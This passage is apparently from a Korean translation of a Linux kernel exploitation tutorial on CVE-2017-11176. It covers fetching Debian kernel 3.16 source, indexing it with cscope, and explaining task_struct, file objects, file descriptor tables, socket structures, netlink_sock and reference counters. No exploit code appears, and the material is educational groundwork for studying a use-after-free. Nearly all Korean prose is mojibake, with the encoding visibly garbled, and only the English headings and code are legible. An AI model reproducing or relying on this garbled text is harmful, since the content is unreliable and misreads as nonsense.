**ì£¼ì˜**: ë¬¸ì„œì—ì„œ ì“°ì¸ íƒ€ê²Ÿê³¼ ì œì‹œëœ íƒ€ê²Ÿì˜ ë‹¤ë¥¸ ì°¨ì´ì ë“¤ ë•Œë¬¸ì— **ì»¤ë„ í¬ë˜ì‹œê°€ ë‚˜ì§€ ì•Šì„ ê²ƒì´ë‹¤**(part 2 ì°¸ê³ ). ê·¸ ì´ìœ ëŠ” ì»¤ë„ì´ ìœ„ì™€ ê°™ì€ íŠ¹ì • ì—ëŸ¬ì—ì„  í¬ë˜ì‹œê°€ ë‚˜ì§€ ì•Šê³  ìµìŠ¤í”Œë¡œì‡ì„ ì¢…ë£Œì‹œí‚¤ê¸° ë•Œë¬¸ì´ë‹¤. ê·¸ëŸ¬ë‚˜ ì»¤ë„ì€ ë¶ˆì•ˆì •í•œ ìƒíƒœì— ìˆê³  ì–¸ì œë“  í¬ë˜ì‹œê°€ ë‚  ìˆ˜ ìˆë‹¤. ì½”ë“œë¥¼ ì½ê³  ì–´ë–¤ ì°¨ì´ì ì´ ìˆëŠ”ì§€ ì´í•´í•˜ëŠ” ê²ƒì„ ê¶Œì¥í•œë‹¤.

### Getting Kernel Source Code

ì‹œìŠ¤í…œì„ ì„¤ì¹˜í•˜ì—¬ ì¤€ë¹„ê°€ ë˜ì—ˆë‹¤ë©´ ì»¤ë„ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì–»ì„ ì°¨ë¡€ë‹¤. íƒ€ê²Ÿì´ *êµ¬ì‹(outdated)* ì»¤ë„ì„ ì“°ë¯€ë¡œ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì´ìš©í•˜ì:

```bash
# wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-source-3.16_3.16.36-1%2Bdeb8u1_all.deb
```

ê·¸ë¦¬ê³  ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•œë‹¤:

```bash
# dpkg -i linux-source-3.16_3.16.36-1+deb8u1_all.deb
```

ì»¤ë„ ì†ŒìŠ¤ ì½”ë“œëŠ” ë‹¤ìŒ ìœ„ì¹˜ì— ì¡´ì¬í•´ì•¼ í•œë‹¤: **/usr/src/linux-source-3.16.tar.xz**

íƒ€ê²Ÿ ì»¤ë„ì´ **í¬ë˜ì‹œê°€ ì˜ ë‚˜ë¯€ë¡œ**, ì»¤ë„ ì½”ë“œ ë¶„ì„ê³¼ ìµìŠ¤í”Œë¡œì‡ ê°œë°œì„ **í˜¸ìŠ¤íŠ¸ ì‹œìŠ¤í…œì—ì„œ** ìˆ˜í–‰í•´ì•¼ í•œë‹¤. That is, get those source back to your host system. íƒ€ê²Ÿì€ SystemTapì„ ì´ìš©í•˜ëŠ” ê²ƒê³¼ ìµìŠ¤í”Œë¡œì‡ì„ ì»´íŒŒì¼í•˜ê³  ì‹¤í–‰í•˜ëŠ” ë°ë§Œ ì´ìš©í•´ì•¼ í•œë‹¤(sshë¥¼ ì“°ì!).

ì—¬ê¸°ì„œë¶€í„´ ì–´ë–¤ ì½”ë“œ í¬ë¡¤ë§ íˆ´ì„ ì‚¬ìš©í•´ë„ ëœë‹¤. ì‹¬ë³¼ë“¤ì„ íš¨ìœ¨ì ìœ¼ë¡œ ìƒí˜¸ ì°¸ì¡°(cross-reference)í•  **í•„ìš”ê°€ ìˆë‹¤**. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ë¦¬ëˆ…ìŠ¤ì˜ ìˆ˜ë§ì€ ì½”ë“œ ì‚¬ì´ì—ì„œ ê¸¸ì„ ìƒì„ì§€ë„ ëª¨ë¥¸ë‹¤.

ë§ì€ ì»¤ë„ ê°œë°œìë“¤ì€ **cscope**ë¥¼ ì‚¬ìš©í•œë‹¤. [ì´ ë°©ë²•](http://cscope.sourceforge.net/large_projects.html)ì„ ì‚¬ìš©í•˜ê±°ë‚˜ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒí˜¸ ì°¸ì¡°ë¥¼ ë§Œë“¤ì–´ë‚¼ ìˆ˜ ìˆë‹¤:

```plaintext
cscope -kqRubv
```

*-k* í•œì •ì(modifier)ê°€ ë§ˆì¹˜ ì»¤ë„ì´ [freestanding](https://wiki.osdev.org/C_Library#Freestanding_and_Hosted)ìœ¼ë¡œ ëŒì•„ê°€ëŠ” ê²ƒì²˜ëŸ¼ ì‹œìŠ¤í…œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í—¤ë”ë¥¼ ì œì™¸í•œë‹¤ëŠ” ì ì— ì£¼ëª©í•˜ì. cscope ë°ì´í„°ë² ì´ìŠ¤ ìƒì„±ì—” ì‹œê°„ì´ ëª‡ ë¶„ ê±¸ë¦°ë‹¤. ìƒì„±ì´ ë˜ë©´ ê·¸ì— ëŒ€í•œ í”ŒëŸ¬ê·¸ì¸ì´ ìˆëŠ” ì—ë””í„°(vim, emacs ë“±)ë¥¼ ì´ìš©í•˜ì.

ì´ì œ ìš°ë¦¬ì˜ ì²« ì»¤ë„ ìµìŠ¤í”Œë¡œì‡ì„ ê°œë°œí•  ì¤€ë¹„ê°€ ëœ ê²ƒì´ë‹¤.

í–‰ìš´ì„ ë¹ˆë‹¤. ì œëŒ€ë¡œ ë†€ì•„ë³´ì! ğŸ˜
- - -
## <a name='core-concepts'></a>í•µì‹¬ ê°œë… #1

CVE ë¶„ì„ ê³¼ì •ì—ì„œ ê¸¸ì„ ìƒì§€ ì•Šìœ¼ë ¤ë©´ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì˜ ëª‡ ëª‡ í•µì‹¬ ê°œë…ì— ëŒ€í•´ ì•Œì•„ì•¼ í•œë‹¤. ì—¬ê¸°ì„œ ë‚˜ì˜¤ëŠ” ëŒ€ë¶€ë¶„ì˜ êµ¬ì¡°ì²´ëŠ” ê°„ë‹¨í•˜ê²Œ ë³´ì—¬ì£¼ê¸° ìœ„í•´ ê°„ì†Œí™”ë˜ì—ˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì.

### Process descriptor (task\_struct) and the current macro

ì»¤ë„ì—ì„œ ì œì¼ ì¤‘ìš”í•œ êµ¬ì¡°ì²´ ì¤‘ í•˜ë‚˜ëŠ” **struct task\_struct**ì´ë‹¤. ë‹¤ë§Œ ê²°ì½” ê°„ë‹¨í•˜ì§„ ì•Šë‹¤.

ëª¨ë“  íƒœìŠ¤í¬ëŠ” ë©”ëª¨ë¦¬ ìƒì— *task\_struct* ì˜¤ë¸Œì íŠ¸ë¥¼ ê°€ì§€ê³  ìˆë‹¤. ìœ ì € ì˜ì—­(userland)ì˜ *í”„ë¡œì„¸ìŠ¤*ëŠ” í•˜ë‚˜ ì´ìƒì˜ íƒœìŠ¤í¬ë¡œ ì´ë£¨ì–´ì ¸ ìˆë‹¤. ë©€í‹° ìŠ¤ë ˆë“œ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„  ê°ê°ì˜ ìŠ¤ë ˆë“œê°€ í•˜ë‚˜ì˜ *task\_struct*ë¥¼ ê°€ì§€ê³  ìˆë‹¤. ì»¤ë„ ìŠ¤ë ˆë“œë„ ê°ìì˜ ê³ ìœ í•œ task\_structë¥¼ ê°€ì§€ê³  ìˆë‹¤(kworker, migration ë“±).

task\_structëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì¤‘ìš”í•œ ì •ë³´ë¥¼ ë‹´ê³  ìˆë‹¤:

```c
// [include/linux/sched.h]

struct task_struct {
    volatile long state;            // process state (running, stopped, ...)
    void *stack;                    // task's stack pointer
    int prio;                       // process priority
    struct mm_struct *mm;           // memory address space
    struct files_struct *files;     // open file information
    const struct cred *cred;        // credentials
  // ...
};
```

í˜„ì¬ êµ¬ë™ì¤‘ì¸ taskì— ì ‘ê·¼í•˜ëŠ” ê²ƒì€ í”í•œ ì‘ì—…ì´ê¸° ë•Œë¬¸ì— í¬ì¸í„°ë¥¼ ì–»ëŠ” ë§¤í¬ë¡œê°€ ì¡´ì¬í•œë‹¤: **current**.

### File Descriptor, File Object and File Descriptor Table

*ëª¨ë“  ê²ƒì´ íŒŒì¼ì´ë‹¤*ë¼ëŠ” ë§ì€ ëˆ„êµ¬ë‚˜ ì•Œê³  ìˆë‹¤. ì´ ë§ì´ [ì˜ë¯¸í•˜ëŠ” ê²ƒ](https://yarchive.net/comp/linux/everything_is_file.html)ì€ ë­˜ê¹Œ?

ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì—” ê¸°ë³¸ì ìœ¼ë¡œ ì¼ê³± ê°€ì§€ ì¢…ë¥˜ì˜ íŒŒì¼ì´ ì¡´ì¬í•œë‹¤: regular, directory, link, character device, block device, fifo and socket. ì´ë“¤ ê°ê°ì€ **file descriptor**ë¥¼ í†µí•´ ë³´ì¼(represented) ìˆ˜ ìˆë‹¤. file descriptorëŠ” ì£¼ì–´ì§„ í”„ë¡œì„¸ìŠ¤ì—ë§Œ ì˜ë¯¸ê°€ ìˆëŠ” ì •ìˆ˜(integer)ì´ë‹¤. ê°ê°ì˜ file descriptorì—” ì—°ê´€ëœ êµ¬ì¡°ì²´ì¸ **struct file**ì´ ìˆë‹¤.

struct *file*(í˜¹ì€ file ì˜¤ë¸Œì íŠ¸)ì€ **ì—´ë ¤ ìˆëŠ”** íŒŒì¼ì„ ë‚˜íƒ€ë‚¸ë‹¤(represent). ë””ìŠ¤í¬ì— ì €ì¥ëœ íŒŒì¼ê³¼ëŠ” ì—°ê²°ë˜ì§€ ì•ŠëŠ”ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ **/proc**ê³¼ ê°™ì€ *pseudo-file systems* ì•ˆì˜ íŒŒì¼ì— ì ‘ê·¼í•œë‹¤ê³  ìƒê°í•´ë³´ì. ì‹œìŠ¤í…œì€ íŒŒì¼ì„ ì½ëŠ” ê³¼ì • ì¤‘ì— ì»¤ì„œë¥¼ ì¶”ì í•˜ê³  ìˆì–´ì•¼(keep track of) í• ì§€ë„ ëª¨ë¥¸ë‹¤. ì´ëŸ¬í•œ ì •ë³´ê°€ struct fileì— ë“¤ì–´ìˆëŠ” ì •ë³´ì´ë‹¤. struct fileì— ëŒ€í•œ í¬ì¸í„°ëŠ” *filp*(file pointer)ë¼ê³  í•œë‹¤.

struct fileì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í•„ë“œëŠ” ì´ê²ƒì´ë‹¤:

```c
// [include/linux/fs.h]

struct file {
    loff_t                            f_pos;            // "cursor" while reading file
    atomic_long_t                     f_count;          // object's reference counter
    const struct file_operations      *f_op;            // virtual function table (VFT) pointer
    void                              *private_data;    // used by file "specialization"
  // ...
};
```

file descriptorë¥¼ struct file í¬ì¸í„°ë¡œ ë°”ê¿”ì£¼ëŠ” ë§¤í•‘ì„ ë‹´ë‹¹í•˜ëŠ” ê±´ **file descriptor table (fdt)**ì´ë‹¤. ì´ ë§¤í•‘ì€ ì¼ëŒ€ì¼ì´ ì•„ë‹ˆë¯€ë¡œ ì—¬ëŸ¬ file descriptorê°€ í•œ file ì˜¤ë¸Œì íŠ¸ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆì„ ìˆ˜ ìˆë‹¤. ì´ ê²½ìš° ê°€ë¦¬ì¼œì§„ file ì˜¤ë¸Œì íŠ¸ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŠ¸ê°€ í•˜ë‚˜ ì˜¬ë¼ê°„ë‹¤([Reference Counters](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#reference-counters) ì°¸ê³ ). FDTëŠ” **struct fdtable** êµ¬ì¡°ì²´ì— ì €ì¥ë˜ì–´ ìˆë‹¤. ì´ êµ¬ì¡°ì²´ëŠ” file descriptorë¡œë¶€í„° ì¸ë±ì‹±ë  ìˆ˜ ìˆëŠ” struct file í¬ì¸í„°ì˜ ë°°ì—´ì´ë‹¤.

```c
// [include/linux/fdtable.h]

struct fdtable {
    unsigned int max_fds;
    struct file ** fd;      /* current fd array */
  // ...
};
```

file descriptor tableì„ í”„ë¡œì„¸ìŠ¤ì™€ ì—°ê²°í•´ì£¼ëŠ” ê²ƒì€ **struct files\_struct**ì´ë‹¤. fdtableì´ task_structì— ì§ì ‘ ë‚´ì¥ë˜ì–´ ìˆì§€ ì•Šì€ ì´ìœ ëŠ” ë‹¤ë¥¸ ì •ë³´(close on exec bitmask ë“±)ê°€ ë‹´ê²¨ìˆê¸° ë•Œë¬¸ì´ë‹¤. struct *files\_struct* ë˜í•œ ì—¬ëŸ¬ ìŠ¤ë ˆë“œ(= *task_struct*) ì‚¬ì´ì— ê³µìœ ë  ìˆ˜ ìˆìœ¼ë©°, ëª‡ ëª‡ ìµœì í™” ìš”ë ¹(optimization trick)ë„ ì¡´ì¬í•œë‹¤.

```
// [include/linux/fdtable.h]

struct files_struct {
    atomic_t count;           // reference counter
    struct fdtable *fdt;      // pointer to the file descriptor table
  // ...
};
```

*files\_struct*ì— ëŒ€í•œ í¬ì¸í„°ëŠ” *task\_struct*ì— ì €ì¥ë˜ì–´ ìˆë‹¤(*files* í•„ë“œ).

### Virtual Function Table (VFT)

ëŒ€ë¶€ë¶„ Cë¡œ ì§œì¸ ë¦¬ëˆ…ìŠ¤ëŠ” *ê°ì²´ ì§€í–¥í˜•* ì»¤ë„ì´ë‹¤. *ì¼ë°˜ì„±(genericity)*ë¥¼ íšë“í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ **virtual function table (vft)**ë¥¼ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤. virtual function tableì€ ëŒ€ë¶€ë¶„ì´ í•¨ìˆ˜ í¬ì¸í„°ë¡œ êµ¬ì„±ëœ êµ¬ì¡°ì²´ì´ë‹¤.

ì œì¼ ì˜ ì•Œë ¤ì§„ VFTëŠ” **struct file\_operations**ì´ë‹¤:

```c
// [include/linux/fs.h]

struct file_operations {
    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
    int (*open) (struct inode *, struct file *);
    int (*release) (struct inode *, struct file *);
  // ...
};
```

*ëª¨ë“  ê²ƒì´ íŒŒì¼*ì´ì§€ë§Œ ë‹¤ ê°™ì€ íƒ€ì…ì´ ì•„ë‹ˆë¯€ë¡œ íƒ€ì…ë§ˆë‹¤ ê°ê¸° ë‹¤ë¥¸ **file operations**ê°€ ìˆë‹¤. ì´ë¥¼ **f\_ops**ë¼ ë¶€ë¥¸ë‹¤. ì´ë¥¼ í†µí•´ ì»¤ë„ ì½”ë“œì—ì„œ íŒŒì¼ì„ íŒŒì¼ì˜ íƒ€ì…ì´ë‚˜ code factorizationê³¼ ê´€ê³„ ì—†ì´ ë‹¤ë£° ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œê°€ ëœë‹¤:

```c
        if (file->f_op->read)
            ret = file->f_op->read(file, buf, count, pos);
```

### Socket, Sock and SKB

**struct socket**ì€ ë„¤íŠ¸ì›Œí¬ ìŠ¤íƒì˜ ìµœìƒìœ„ ê³„ì¸µì— ìˆë‹¤. file ê´€ì ì—ì„œ ì´ëŠ” íŠ¹ìˆ˜í™”(specialization)ì˜ ì²« ë‹¨ê³„ì´ë‹¤.ì†Œì¼“ ìƒì„± ì¤‘ì— ìƒˆë¡œìš´ struct fileì´ ìƒì„±ë˜ê³  file operation (*f\_op* í•„ë“œ)dl **socket\_file\_ops**ë¡œ ì„¤ì •ëœë‹¤.

ëª¨ë“  fileì´ file descriptorë¥¼ í†µí•´ í‘œí˜„ë˜ë¯€ë¡œ(represented) file descriptorë¥¼ ì¸ìë¡œ ì“°ëŠ” syscall(read(), write(), close() ë“±)ì€ ë­ë“  ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ì´ê²ƒì´ "*ëª¨ë“  ê²ƒì´ íŒŒì¼ì´ë‹¤*"ë¼ëŠ” ëª¨í† ì˜ ì£¼ìš”í•œ ì¥ì ì´ë‹¤. ì»¤ë„ì€ ì†Œì¼“ì˜ íƒ€ì…ê³¼ ìƒê´€ ì—†ì´ generic socket file operationì„ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤:

```c
// [net/socket.c]

static const struct file_operations socket_file_ops = {
    .read = sock_aio_read,      // <---- calls sock->ops->recvmsg()
    .write =    sock_aio_write, // <---- calls sock->ops->sendmsg()
    .llseek =   no_llseek,      // <---- returns an error
  // ...
}
```

*struct socket*  ì´ *BSD socket API* (connect(), bind(), accept(), listen(), ...)ë¥¼ êµ¬í˜„(implement)í•˜ê¸° ë•Œë¬¸ì— **struct proto\_ops** íƒ€ì…ì˜ íŠ¹ë³„í•œ *virtual function table (vft)* ë¥¼ ë‚´ì¥(embed)í•˜ê³  ìˆë‹¤.

```c
// [include/linux/net.h]

struct proto_ops {
    int     (*bind)    (struct socket *sock, struct sockaddr *myaddr, int sockaddr_len);
    int     (*connect) (struct socket *sock, struct sockaddr *vaddr,  int sockaddr_len, int flags);
    int     (*accept)  (struct socket *sock, struct socket *newsock, int flags);
  // ...
}
```

BSD ìŠ¤íƒ€ì¼ì˜ syscall(ì˜ˆ : bind())ì´ í˜¸ì¶œë˜ë©´ ì»¤ë„ì€ ë‹¤ìŒ ìˆœì„œ(scheme)ë¥¼ ë”°ë¥¸ë‹¤:

1. file descriptor tableë¡œë¶€í„° *struct file*ì„ ì–»ëŠ”ë‹¤.
2. *struct file* ë¡œë¶€í„° *struct socket* ì„ ì–»ëŠ”ë‹¤.
3. íŠ¹ìˆ˜í•œ(specialized) *proto\_ops*  ì½œë°±ì„ í˜¸ì¶œí•œë‹¤ (ì˜ˆ : sock->ops->bind())

ëª‡ ëª‡ í”„ë¡œí† ì½œ ì‘ì—…(operation) (ì˜ˆ: ë°ì´í„° ì „ì†¡/ìˆ˜ì‹ )ì—ì„œ ë„¤íŠ¸ì›Œí¬ ìŠ¤íƒì˜ í•˜ìœ„ ë ˆì´ì–´ë¡œ ê°ˆ(go into) í•„ìš”ê°€ ìˆê¸° ë•Œë¬¸ì—, *struct socket*ì€ **struct sock** ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ê°€ì§€ê³  ìˆë‹¤. ì´ í¬ì¸í„°ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì†Œì¼“ í”„ë¡œí† ì½œ ì‘ì—…(*proto\_ops*)ì— ì˜í•´ ì‚¬ìš©ëœë‹¤. *struct socket*ì´ *struct file*ê³¼ *struct sock* ì‚¬ì´ì—ì„œ ì ‘ì°©ì œê°™ì€ ì—­í• ì„ í•˜ëŠ” ê²ƒì´ë‹¤.

```c
// [include/linux/net.h]

struct socket {
    struct file     *file;
    struct sock     *sk;
    const struct proto_ops  *ops;
  // ...
};
```

*struct sock*  ì€ ë³µì¡í•œ ë°ì´í„° êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆë‹¤. ì´ëŠ” ìƒìœ„ ë ˆì´ì–´(ì†Œì¼“)ê³¼ í•˜ìœ„ ë ˆì´ì–´(ë„¤íŠ¸ì›Œí¬ ì¹´ë“œ ë“œë¼ì´ë²„) ì‚¬ì´ì˜ ì¤‘ê°„ìë¡œ ë³´ì´ê¸°ë„ í•œë‹¤. *struct sock* ì€ receive/send bufferë¥¼ *generic*í•œ ë°©ì‹ìœ¼ë¡œ ì¡ê³ (hold) ìˆëŠ” ê²ƒì´ë‹¤.

ë„¤íŠ¸ì›Œí¬ ì¹´ë“œë¥¼ í†µí•´ íŒ¨í‚·ì„ ìˆ˜ì‹ í•˜ë©´ ë“œë¼ì´ë²„ëŠ” ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ sock receive bufferì— "enqueue"í•œë‹¤. ë“¤ì–´ê°„ íŒ¨í‚·ì€ í”„ë¡œê·¸ë¨ì´ ë°›ì„ ë•Œê¹Œì§€(*recvmsg()* syscall) ë²„í¼ì— ë‚¨ì•„ìˆë‹¤. ë°˜ëŒ€ë¡œ í”„ë¡œê·¸ë¨ì´ ë°ì´í„°ë¥¼ ì†¡ì‹ í•˜ê³  ì‹¶ë‹¤ë©´(*sendmsg()* syscall), ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì€ sock sending bufferì— "enqueue"ëœë‹¤. íŒ¨í‚·ì€ ë„¤íŠ¸ì›Œí¬ ì¹´ë“œê°€ ì¸ì§€í•˜ëŠ” ìˆœê°„ "dequeue"ë˜ê³  ì†¡ì‹ ëœë‹¤.

ì´ëŸ¬í•œ "ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·"ë“¤ì€ **struct sk\_buff**(í˜¹ì€ skb)ì´ë‹¤. receive/send ë²„í¼ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ skbì˜ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì´ë‹¤:

```c
// [include/linux/sock.h]

struct sock {
    int         sk_rcvbuf;    // theorical "max" size of the receive buffer
    int         sk_sndbuf;    // theorical "max" size of the send buffer
    atomic_t        sk_rmem_alloc;  // "current" size of the receive buffer
    atomic_t        sk_wmem_alloc;  // "current" size of the send buffer
    struct sk_buff_head sk_receive_queue;   // head of doubly-linked list
    struct sk_buff_head sk_write_queue;     // head of doubly-linked list
    struct socket       *sk_socket;
  // ...
}
```

ë³¼ ìˆ˜ ìˆë“¯ì´ *struct sock* ì€ *struct socket* ì„ ì°¸ì¡°í•˜ê³ (*sk\_socket* í•„ë“œ), *strcut socket* ì€ *struct sock* ì„ ì°¸ì¡°í•œë‹¤(*sk* í•„ë“œ). ë¹„ìŠ·í•œ ë°©ì‹ìœ¼ë¡œëŠ” *struct socket* ì´ *struct file* ì„ ì°¸ì¡°í•˜ê³ (*file* í•„ë“œ), *struct file* ì´ *struct socket* ì„ ì°¸ì¡°í•˜ëŠ” ê²ƒì´ ìˆë‹¤(*private\_data* í•„ë“œ). ì´ëŸ¬í•œ "ì–‘ë°©í–¥ ë©”ì»¤ë‹ˆì¦˜"(2-way mechanism)ì€ ë°ì´í„°ê°€ ë„¤íŠ¸ì›Œí¬ ìŠ¤íƒì„ í†µí•´ ì˜¬ë¼ê°”ë‹¤ ë‚´ë ¤ê°”ë‹¤ í•  ìˆ˜ ìˆê²Œ í•´ì¤€ë‹¤.

**ë…¸íŠ¸**: í—·ê°ˆë¦¬ì§€ ë§ì! *struct sock*  ì˜¤ë¸Œì íŠ¸ëŠ” ì¤„ì—¬ì„œ *sk* ë¼ ì“°ê³ , *struct socket*  ì˜¤ë¸Œì íŠ¸ëŠ” ì¤„ì—¬ì„œ *sock* ì´ë¼ê³  í•œë‹¤.

### Netlink Socket

Netlink socketì€ UNIX ì†Œì¼“ì´ë‚˜ INET ì†Œì¼“ì²˜ëŸ¼ ì†Œì¼“ì˜ í•œ ì¢…ë¥˜(i.e. family)ì´ë‹¤.

Netlink socket (AF\_NETLINK)ëŠ” ì»¤ë„ ê³µê°„ê³¼ ìœ ì € ê³µê°„ ì‚¬ì´ì˜ í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•´ì¤€ë‹¤. routing tableì„ ìˆ˜ì •í•˜ëŠ” ë°ë„ ì“°ì¼ ìˆ˜ ìˆê³ (NETLINK\_ROUTE protocol), SELinux event notificationì„ ë°›ëŠ” ë°ë„ ì“°ì¼ ìˆ˜ ìˆê³ (NETLINK\_SELINUX), ë‹¤ë¥¸ ìœ ì € ì˜ì—­ í”„ë¡œì„¸ìŠ¤ì™€ í†µì‹ í•˜ëŠ” ë°ë„ ì“°ì¼ ìˆ˜ ìˆë‹¤(NETLINK\_USERSOCK).

*struct sock* ê³¼ *struct socket* ì´ ëª¨ë“  ì†Œì¼“ ì¢…ë¥˜ë¥¼ ì§€ì›í•˜ëŠ” *generic* í•œ ë°ì´í„° êµ¬ì¡°ë‹¤ ë³´ë‹ˆ ëª‡ ëª‡ ì§€ì (point)ì—ì„œ "íŠ¹ìˆ˜í™”"(specialize)í•  í•„ìš”ê°€ ìˆë‹¤.

ì†Œì¼“ ê´€ì ì—ì„œ *proto\_ops*  í•„ë“œëŠ” ì •ì˜ë˜ì–´ì•¼ í•œë‹¤. netlnk family(AF\_NETLINK)ë¥¼ ìœ„í•œ BSD-style ì†Œì¼“ ì˜¤í¼ë ˆì´ì…˜ì€ **netlink\_ops**ì´ë‹¤:

```c
// [net/netlink/af_netlink.c]

static const struct proto_ops netlink_ops = {
    .bind =     netlink_bind,
    .accept =   sock_no_accept,     // <--- calling accept() on netlink sockets leads to EOPNOTSUPP error
    .sendmsg =  netlink_sendmsg,
    .recvmsg =  netlink_recvmsg,
  // ...
}
```

ì†Œì¼“ ê´€ì ì—ì„œ ë³´ë©´ ì´ëŠ” ì¢€ ë” ë³µì¡í•˜ë‹¤.*struct sock*  ì´ ì¶”ìƒ í´ë˜ìŠ¤ë¡œ ë³´ì¼ ìˆ˜ë„ ìˆë‹¤. ë”°ë¼ì„œ sockì€ íŠ¹ìˆ˜í™”ë  í•„ìš”ê°€ ìˆë‹¤. netlinkì˜ ê²½ìš°ëŠ” **struct netlink\_sock**ì„ í†µí•´ íŠ¹ìˆ˜í™”ë¥¼ í•œë‹¤:

```c
// [include/net/netlink_sock.h]

struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;
    u32         pid;
    u32         dst_pid;
    u32         dst_group;
  // ...
};
```

ë‹¤ì‹œ ë§í•´ *netlnk\_sock* ì€ ëª‡ ëª‡ ì¶”ê°€ì ì¸ ì†ì„±ì´ ë”í•´ì§„ "sock"ì´ë‹¤(i.e. inheritance).

ìµœìƒìœ„ commentëŠ” êµ‰ì¥íˆ ì¤‘ìš”í•˜ë‹¤(?). ì»¤ë„ì´ genericí•œ *struct sock* ì„ ì •í™•í•œ íƒ€ì…ì„ ëª°ë¼ë„ ë‹¤ë£° ìˆ˜ ìˆê²Œ í•´ì¤€ë‹¤.  It also brings another benefit, the *&netlink_sock.sk* and *&netlink_sock* addresses **aliases**(?). ê·¸ ê²°ê³¼ *&netlink\_sock.sk*  í¬ì¸í„°ë¥¼ í•´ì œí•˜ë©´ *netlink\_sock*  ì˜¤ë¸Œì íŠ¸ê°€ ì „ë¶€ í•´ì œëœë‹¤. language theory ê´€ì ì—ì„œ ë³´ë©´ ì´ê²ƒì´ ë°”ë¡œ Cì–¸ì–´ê°€ ì§€ì›í•˜ì§€ ì•ŠìŒì—ë„ ì»¤ë„ì´ *type polymorphism* ì„ í•  ìˆ˜ ìˆëŠ” ì´ìœ ì´ë‹¤. ë”°ë¼ì„œ *netlink\_sock*  life cycle logicì€ genericí•˜ê³  ê²€ì¦ëœ ì½”ë“œë¡œ ìœ ì§€í•  ìˆ˜ ìˆë‹¤.

### Putting it all together

ì´ì œ í•µì‹¬ ë°ì´í„° êµ¬ì¡°ëŠ” ë‹¤ ì†Œê°œí•˜ì˜€ë‹¤. ì´ì œ ì„œë¡œì˜ ê´€ê³„ë¥¼ ê·¸ë¦¼ìœ¼ë¡œ ì‹œê°í™”í•´ì„œ ë³¼ ì°¨ë¡€ë‹¤.

![Core Structure Relationship](https://blog.lexfo.fr/images/cve-2017-11176-linux/core_struct_relationship.png)

**ì½ì„ê±°ë¦¬**: ê°ê°ì˜ í™”ì‚´í‘œëŠ” í¬ì¸í„°ë¥¼ ì˜ë¯¸í•œë‹¤. ì–´ë–¤ ì„ ë„ "êµì°¨í•˜ì§€" ì•ŠëŠ”ë‹¤. "sock" êµ¬ì¡°ì²´ëŠ” "netlink\_sock" êµ¬ì¡°ì²´ ì•ˆì— ë‚´ì¥ë˜ì–´ ìˆë‹¤.

### Reference counters

ì»¤ë„ í•µì‹¬ ê°œë…ì— ëŒ€í•œ ì†Œê°œë¥¼ ë§ˆì¹˜ë ¤ë©´ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì—ì„œ **ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°**ë¥¼ ì–´ë–»ê²Œ ë‹¤ë£¨ëŠ”ì§€ ì´í•´í•´ì•¼ í•œë‹¤.

ë©”ëª¨ë¦¬ leakì„ ì¤„ì´ê³  *use-after-free*  ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ëŒ€ë¶€ë¶„ì˜ ë¦¬ëˆ…ìŠ¤ ë°ì´í„° êµ¬ì¡°ëŠ” "ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°"ë¥¼ ë‚´ì¥í•˜ê³  ìˆë‹¤. ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„° ìì²´ëŠ” ë³´í†µ ì •ìˆ˜ì¸ **atomic\_t**ë¡œ ë‚˜íƒ€ë‚¸ë‹¤(represent). ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ëŠ” ì˜¤ì§ ë‹¤ìŒê³¼ ê°™ì€ atomic operationì„ í†µí•´ì„œë§Œ ë‹¤ë£° ìˆ˜ ìˆë‹¤:

* **atomic\_inc()**
* **atomic\_add()**
* **atomic\_dec\_and\_test()** // 1ì„ ë¹¼ê³  0ê³¼ ê°™ì€ì§€ í…ŒìŠ¤íŠ¸

